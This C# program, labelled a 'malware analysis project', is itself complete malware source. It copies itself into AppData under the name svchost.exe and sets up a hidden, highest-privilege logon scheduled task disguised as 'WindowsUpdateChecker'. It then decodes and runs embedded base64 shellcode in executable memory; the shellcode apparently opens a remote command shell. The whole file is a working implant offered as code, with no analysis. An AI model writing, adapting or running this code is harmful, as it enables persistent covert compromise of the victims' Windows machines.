using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace MalwareAnalysisProject
{
    internal class Program
    {
        // Windows API imports for shellcode execution
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "--payload")
            {
                ExecuteShellcodeInMemory();
            }
            else
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appDataPath, "Microsoft", "Windows");
                string targetPath = Path.Combine(targetDir, "svchost.exe");

                if (!Directory.Exists(targetDir))
                    Directory.CreateDirectory(targetDir);

                if (!File.Exists(targetPath))
                {
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, targetPath);
                }

                TryCreateScheduledTask(targetPath);
            }
        }

        public static void ExecuteShellcodeInMemory()
        {
            try
            {
                string base64EncryptedShellcode = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7CgACD0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==";

                byte[] shellcode = Convert.FromBase64String(base64EncryptedShellcode);

                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);

                IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Shellcode execution failed: " + ex.Message);
            }
        }

        static bool TryCreateScheduledTask(string filePath)
        {
            try
            {
                string command = $"/create /sc onlogon /tn WindowsUpdateChecker /tr \"{filePath} --payload\" /rl HIGHEST /f";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = command,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (Process proc = Process.Start(psi))
                {
                    proc.WaitForExit();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}

